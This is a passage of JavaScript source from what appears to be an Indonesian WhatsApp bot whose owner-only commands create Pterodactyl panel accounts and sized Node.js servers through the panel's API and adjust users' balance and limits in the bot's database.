let f3 = await fetch(panel + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apiuser,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let ctf = await m.reply(`*SUCCES CREATE*

 • Name : ${pushname}
 • Nomor : ${m.sender.split("@")[0]}
 • Tanggal : ${Kalender91}

*YOUR PANEL*

 • ID : ${user.id}
 • Username : ${user.username}
 • Email : ${user.email}
 • Name : ${user.first_name} ${user.last_name}
 • Bahasa : ${user.language}
 • Admin : ${user.root_admin}

Password telah dikirim di private chat @${u.split`@`[0]}`)

let txt = `
email: ${email}
username: ${username}
password: ${password.toString()}
login: ${panel}

`
let button = [
              {
                 "name": "cta_copy",
                 "buttonParamsJson": `{\"display_text\":\"Username\",\"id\":\"123456789\",\"copy_code\":\"${username}\"}`
              },{
                 "name": "cta_copy",
                 "buttonParamsJson": `{\"display_text\":\"Password\",\"id\":\"123456789\",\"copy_code\":\"${password.toString()}\"}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": `{\"display_text\":\"Login\",\"url\":\"${panel}\",\"merchant_url\":\"${panel}\"}`
              }
           ]
sendButtonBiasa(u, `*THIS YOUR ACCOUNT*`, txt, button)
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case '15gb': {
if (!isCreator) return tolakk(mess.OnlyOwner)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Buat Dengan Cara!*
isi nama 👇🏾   nomor mu 👇🏾
${prefix + command} namamu,${nomore}`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + " 15gb"
let egg = eggsnya
let loc = location
let memo = "15200"
let cpu = "250"
let disk = "15200"
let email = username + "@gmail.com"
if (!u) return
let d = (await vreden.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(panel + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apiuser
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
let user = data.attributes
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let f2 = await fetch(panel + "/api/application/nests/" + netsnya + "/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apiuser
}
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(panel + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apiuser,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let ctf = await m.reply(`*SUCCES CREATE*

 • Name : ${pushname}
 • Nomor : ${m.sender.split("@")[0]}
 • Tanggal : ${Kalender91}

*YOUR PANEL*

 • ID : ${user.id}
 • Username : ${user.username}
 • Email : ${user.email}
 • Name : ${user.first_name} ${user.last_name}
 • Bahasa : ${user.language}
 • Admin : ${user.root_admin}

Password telah dikirim di private chat @${u.split`@`[0]}`)

let txt = `
email: ${email}
username: ${username}
password: ${password.toString()}
login: ${panel}

`
let button = [
              {
                 "name": "cta_copy",
                 "buttonParamsJson": `{\"display_text\":\"Username\",\"id\":\"123456789\",\"copy_code\":\"${username}\"}`
              },{
                 "name": "cta_copy",
                 "buttonParamsJson": `{\"display_text\":\"Password\",\"id\":\"123456789\",\"copy_code\":\"${password.toString()}\"}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": `{\"display_text\":\"Login\",\"url\":\"${panel}\",\"merchant_url\":\"${panel}\"}`
              }
           ]
sendButtonBiasa(u, `*THIS YOUR ACCOUNT*`, txt, button)
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case '16gb': {
if (!isCreator) return tolakk(mess.OnlyOwner)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Buat Dengan Cara!*
isi nama 👇🏾   nomor mu 👇🏾
${prefix + command} namamu,${nomore}`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + " 16gb"
let egg = eggsnya
let loc = location
let memo = "16200"
let cpu = "260"
let disk = "16200"
let email = username + "@gmail.com"
if (!u) return
let d = (await vreden.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(panel + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apiuser
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
let user = data.attributes
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let f2 = await fetch(panel + "/api/application/nests/" + netsnya + "/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apiuser
}
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(panel + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apiuser,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let ctf = await m.reply(`*SUCCES CREATE*

 • Name : ${pushname}
 • Nomor : ${m.sender.split("@")[0]}
 • Tanggal : ${Kalender91}

*YOUR PANEL*

 • ID : ${user.id}
 • Username : ${user.username}
 • Email : ${user.email}
 • Name : ${user.first_name} ${user.last_name}
 • Bahasa : ${user.language}
 • Admin : ${user.root_admin}

Password telah dikirim di private chat @${u.split`@`[0]}`)

let txt = `
email: ${email}
username: ${username}
password: ${password.toString()}
login: ${panel}

`
let button = [
              {
                 "name": "cta_copy",
                 "buttonParamsJson": `{\"display_text\":\"Username\",\"id\":\"123456789\",\"copy_code\":\"${username}\"}`
              },{
                 "name": "cta_copy",
                 "buttonParamsJson": `{\"display_text\":\"Password\",\"id\":\"123456789\",\"copy_code\":\"${password.toString()}\"}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": `{\"display_text\":\"Login\",\"url\":\"${panel}\",\"merchant_url\":\"${panel}\"}`
              }
           ]
sendButtonBiasa(u, `*THIS YOUR ACCOUNT*`, txt, button)
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case '17gb': {
if (!isCreator) return tolakk(mess.OnlyOwner)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Buat Dengan Cara!*
isi nama 👇🏾   nomor mu 👇🏾
${prefix + command} namamu,${nomore}`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + " 17gb"
let egg = eggsnya
let loc = location
let memo = "17200"
let cpu = "270"
let disk = "17200"
let email = username + "@gmail.com"
if (!u) return
let d = (await vreden.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(panel + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apiuser
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
let user = data.attributes
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let f2 = await fetch(panel + "/api/application/nests/" + netsnya + "/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apiuser
}
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(panel + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apiuser,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let ctf = await m.reply(`*SUCCES CREATE*

 • Name : ${pushname}
 • Nomor : ${m.sender.split("@")[0]}
 • Tanggal : ${Kalender91}

*YOUR PANEL*

 • ID : ${user.id}
 • Username : ${user.username}
 • Email : ${user.email}
 • Name : ${user.first_name} ${user.last_name}
 • Bahasa : ${user.language}
 • Admin : ${user.root_admin}

Password telah dikirim di private chat @${u.split`@`[0]}`)

let txt = `
email: ${email}
username: ${username}
password: ${password.toString()}
login: ${panel}

`
let button = [
              {
                 "name": "cta_copy",
                 "buttonParamsJson": `{\"display_text\":\"Username\",\"id\":\"123456789\",\"copy_code\":\"${username}\"}`
              },{
                 "name": "cta_copy",
                 "buttonParamsJson": `{\"display_text\":\"Password\",\"id\":\"123456789\",\"copy_code\":\"${password.toString()}\"}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": `{\"display_text\":\"Login\",\"url\":\"${panel}\",\"merchant_url\":\"${panel}\"}`
              }
           ]
sendButtonBiasa(u, `*THIS YOUR ACCOUNT*`, txt, button)
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case '18gb': {
if (!isCreator) return tolakk(mess.OnlyOwner)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Buat Dengan Cara!*
isi nama 👇🏾   nomor mu 👇🏾
${prefix + command} namamu,${nomore}`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + " 18gb"
let egg = eggsnya
let loc = location
let memo = "18200"
let cpu = "280"
let disk = "18200"
let email = username + "@gmail.com"
if (!u) return
let d = (await vreden.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(panel + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apiuser
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
let user = data.attributes
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let f2 = await fetch(panel + "/api/application/nests/" + netsnya + "/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apiuser
}
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(panel + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apiuser,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let ctf = await m.reply(`*SUCCES CREATE*

 • Name : ${pushname}
 • Nomor : ${m.sender.split("@")[0]}
 • Tanggal : ${Kalender91}

*YOUR PANEL*

 • ID : ${user.id}
 • Username : ${user.username}
 • Email : ${user.email}
 • Name : ${user.first_name} ${user.last_name}
 • Bahasa : ${user.language}
 • Admin : ${user.root_admin}

Password telah dikirim di private chat @${u.split`@`[0]}`)

let txt = `
email: ${email}
username: ${username}
password: ${password.toString()}
login: ${panel}

`
let button = [
              {
                 "name": "cta_copy",
                 "buttonParamsJson": `{\"display_text\":\"Username\",\"id\":\"123456789\",\"copy_code\":\"${username}\"}`
              },{
                 "name": "cta_copy",
                 "buttonParamsJson": `{\"display_text\":\"Password\",\"id\":\"123456789\",\"copy_code\":\"${password.toString()}\"}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": `{\"display_text\":\"Login\",\"url\":\"${panel}\",\"merchant_url\":\"${panel}\"}`
              }
           ]
sendButtonBiasa(u, `*THIS YOUR ACCOUNT*`, txt, button)
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case '19gb': {
if (!isCreator) return tolakk(mess.OnlyOwner)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Buat Dengan Cara!*
isi nama 👇🏾   nomor mu 👇🏾
${prefix + command} namamu,${nomore}`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + " 19gb"
let egg = eggsnya
let loc = location
let memo = "19200"
let cpu = "290"
let disk = "19200"
let email = username + "@gmail.com"
if (!u) return
let d = (await vreden.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(panel + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apiuser
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
let user = data.attributes
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let f2 = await fetch(panel + "/api/application/nests/" + netsnya + "/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apiuser
}
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(panel + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apiuser,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let ctf = await m.reply(`*SUCCES CREATE*

 • Name : ${pushname}
 • Nomor : ${m.sender.split("@")[0]}
 • Tanggal : ${Kalender91}

*YOUR PANEL*

 • ID : ${user.id}
 • Username : ${user.username}
 • Email : ${user.email}
 • Name : ${user.first_name} ${user.last_name}
 • Bahasa : ${user.language}
 • Admin : ${user.root_admin}

Password telah dikirim di private chat @${u.split`@`[0]}`)

let txt = `
email: ${email}
username: ${username}
password: ${password.toString()}
login: ${panel}

`
let button = [
              {
                 "name": "cta_copy",
                 "buttonParamsJson": `{\"display_text\":\"Username\",\"id\":\"123456789\",\"copy_code\":\"${username}\"}`
              },{
                 "name": "cta_copy",
                 "buttonParamsJson": `{\"display_text\":\"Password\",\"id\":\"123456789\",\"copy_code\":\"${password.toString()}\"}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": `{\"display_text\":\"Login\",\"url\":\"${panel}\",\"merchant_url\":\"${panel}\"}`
              }
           ]
sendButtonBiasa(u, `*THIS YOUR ACCOUNT*`, txt, button)
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case '20gb': {
if (!isCreator) return tolakk(mess.OnlyOwner)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Buat Dengan Cara!*
isi nama 👇🏾   nomor mu 👇🏾
${prefix + command} namamu,${nomore}`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + " 20gb"
let egg = eggsnya
let loc = location
let memo = "20200"
let cpu = "300"
let disk = "20200"
let email = username + "@gmail.com"
if (!u) return
let d = (await vreden.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(panel + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apiuser
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
let user = data.attributes
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let f2 = await fetch(panel + "/api/application/nests/" + netsnya + "/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apiuser
}
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(panel + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apiuser,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let ctf = await m.reply(`*SUCCES CREATE*

 • Name : ${pushname}
 • Nomor : ${m.sender.split("@")[0]}
 • Tanggal : ${Kalender91}

*YOUR PANEL*

 • ID : ${user.id}
 • Username : ${user.username}
 • Email : ${user.email}
 • Name : ${user.first_name} ${user.last_name}
 • Bahasa : ${user.language}
 • Admin : ${user.root_admin}

Password telah dikirim di private chat @${u.split`@`[0]}`)

let txt = `
email: ${email}
username: ${username}
password: ${password.toString()}
login: ${panel}

`
let button = [
              {
                 "name": "cta_copy",
                 "buttonParamsJson": `{\"display_text\":\"Username\",\"id\":\"123456789\",\"copy_code\":\"${username}\"}`
              },{
                 "name": "cta_copy",
                 "buttonParamsJson": `{\"display_text\":\"Password\",\"id\":\"123456789\",\"copy_code\":\"${password.toString()}\"}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": `{\"display_text\":\"Login\",\"url\":\"${panel}\",\"merchant_url\":\"${panel}\"}`
              }
           ]
sendButtonBiasa(u, `*THIS YOUR ACCOUNT*`, txt, button)
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'unli': case '0gb': case 'unlimited': {
if (!isCreator) return tolakk(mess.OnlyOwner)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Buat Dengan Cara!*
isi nama 👇🏾   nomor mu 👇🏾
${prefix + command} namamu,${nomore}`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + " 0gb"
let egg = eggsnya
let loc = location
let memo = "0"
let cpu = "0"
let disk = "0"
let email = username + "@gmail.com"
if (!u) return
let d = (await vreden.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(panel + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apiuser
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
let user = data.attributes
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let f2 = await fetch(panel + "/api/application/nests/" + netsnya + "/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apiuser
}
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(panel + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apiuser,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let ctf = await m.reply(`*SUCCES CREATE*

 • Name : ${pushname}
 • Nomor : ${m.sender.split("@")[0]}
 • Tanggal : ${Kalender91}

*YOUR PANEL*

 • ID : ${user.id}
 • Username : ${user.username}
 • Email : ${user.email}
 • Name : ${user.first_name} ${user.last_name}
 • Bahasa : ${user.language}
 • Admin : ${user.root_admin}

Password telah dikirim di private chat @${u.split`@`[0]}`)

let txt = `
email: ${email}
username: ${username}
password: ${password.toString()}
login: ${panel}

`
let button = [
              {
                 "name": "cta_copy",
                 "buttonParamsJson": `{\"display_text\":\"Username\",\"id\":\"123456789\",\"copy_code\":\"${username}\"}`
              },{
                 "name": "cta_copy",
                 "buttonParamsJson": `{\"display_text\":\"Password\",\"id\":\"123456789\",\"copy_code\":\"${password.toString()}\"}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": `{\"display_text\":\"Login\",\"url\":\"${panel}\",\"merchant_url\":\"${panel}\"}`
              }
           ]
sendButtonBiasa(u, `*THIS YOUR ACCOUNT*`, txt, button)
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'addb': case 'adduang': case 'addbalance': case 'addbal': {
if (!isCreator) return tolakk(mess.OnlyOwner)
if (!text) return warning(`Gunakan dengan cara ${prefix+command} *@tag nominal*\n\nContoh : ${prefix+command} @6285600793871 2000`)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : args[0].replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (ownerNumber.includes(users)) return warning('Tidak Dapat Melakukannya Kepada Owner')
if (!m.mentionedJid[0] && !m.quoted && !text) return warning(`Tag/Reply Target Yang Mau Di ${command}`)
if (!args[1]) return warning(`Masukkan nominal nya!\n\nContoh : ${prefix+command} @6285600793871 2000`)
if (isNaN(args[1])) return warning(`Nominal harus berupa angka!\n\nContoh : ${prefix+command} @6285600793871 2000`)
if (args[1] === 'infinity') return warning(`Yahaha saya ndak bisa di tipu`)
if (args[1].includes("-")) return warning(`Jangan menggunakan -\n\nContoh : ${prefix+command} @6285600793871 2000`)
addCountCmd('transfer', m.sender, _cmd)
db.data.users[users].saldo += parseInt(args[1])
vreden.sendTextWithMentions(m.chat, `Sukses top up saldo sebesar ${args[1]} kepada @${users.split("@")[0]}`, m)
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'kuruang': case 'kurbalance': case 'kurbal': {
if (!isCreator) return tolakk(mess.OnlyOwner)
if (!text) return warning(`Gunakan dengan cara ${prefix+command} *@tag nominal*\n\nContoh : ${prefix+command} @6285600793871 2000`)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : args[0].replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (!m.mentionedJid[0] && !m.quoted && !text) return warning(`Tag/Reply Target Yang Mau Di ${command}`)
if (!args[1]) return warning(`Masukkan nominal nya!\n\nContoh : ${prefix+command} @6285600793871 2000`)
if (isNaN(args[1])) return warning(`Nominal harus berupa angka!\n\nContoh : ${prefix+command} @6285600793871 2000`)
if (args[1] === 'infinity') return warning(`Yahaha saya ndak bisa di tipu`)
if (args[1].includes("-")) return warning(`Jangan menggunakan -\n\nContoh : ${prefix+command} @6285600793871 2000`)
var anu = db.data.users[m.sender].saldo
if (anu < args[1] || anu == 'undefined') return warning(`Saldo @${users.split("@")[0]} Tidak Mencukupi Untuk Dikurang Sebesar Rp ${args[1]}\nKetik ${prefix}saldo @${users.split("@")[0]}, untuk mengecek Saldo target!`)
addCountCmd('transfer', m.sender, _cmd)
db.data.users[users].saldo -= parseInt(args[1])
vreden.sendTextWithMentions(m.chat, `Sukses kurang saldo sebesar ${args[1]} dari @${users.split("@")[0]}`, m)
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'addlimit': {
if (!isCreator) return tolakk(mess.OnlyOwner)
if (!text) return warning(`Gunakan dengan cara ${prefix+command} *@tag nominal*\n\nContoh : ${prefix+command} @6285600793871 2000`)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : args[0].replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (ownerNumber.includes(users)) return warning('Tidak Dapat Melakukannya Kepada Owner')
if (!m.mentionedJid[0] && !m.quoted && !text) return warning(`Tag/Reply Target Yang Mau Di ${command}`)
if (!args[1]) return warning(`Masukkan nominal nya!\n\nContoh : ${prefix+command} @6285600793871 2000`)
if (isNaN(args[1])) return warning(`Nominal harus berupa angka!\n\nContoh : ${prefix+command} @6285600793871 2000`)
if (args[1] === 'infinity') return warning(`Yahaha saya ndak bisa di tipu`)
if (args[1].includes("-")) return warning(`Jangan menggunakan -\n\nContoh : ${prefix+command} @6285600793871 2000`)
db.data.users[users].limit += parseInt(args[1])
vreden.sendTextWithMentions(m.chat, `Sukses top up limit sebesar ${args[1]} kepada @${users.split("@")[0]}`, m)
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'addglimit': case 'addgamelimit': {
if (!isCreator) return tolakk(mess.OnlyOwner)
if (!text) return warning(`Gunakan dengan cara ${prefix+command} *@tag nominal*\n\nContoh : ${prefix+command} @6285600793871 2000`)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : args[0].replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (ownerNumber.includes(users)) return warning('Tidak Dapat Melakukannya Kepada Owner')
if (!m.mentionedJid[0] && !m.quoted && !text) return warning(`Tag/Reply Target Yang Mau Di ${command}`)
if (!args[1]) return warning(`Masukkan nominal nya!\n\nContoh : ${prefix+command} @6285600793871 2000`)
if (isNaN(args[1])) return warning(`Nominal harus berupa angka!\n\nContoh : ${prefix+command} @6285600793871 2000`)
if (args[1] === 'infinity') return warning(`Yahaha saya ndak bisa di tipu`)
if (args[1].includes("-")) return warning(`Jangan menggunakan -\n\nContoh : ${prefix+command} @6285600793871 2000`)
addCountCmd('transfer', m.sender, _cmd)
db.data.users[users].glimit += parseInt(args[1])
vreden.sendTextWithMentions(m.chat, `Sukses top up game limit sebesar ${args[1]} kepada @${users.split("@")[0]}`, m)
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'me': case 'saldo': case 'limit': case 'balance': case 'ceklimit': case 'cekbalance': {
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : m.sender
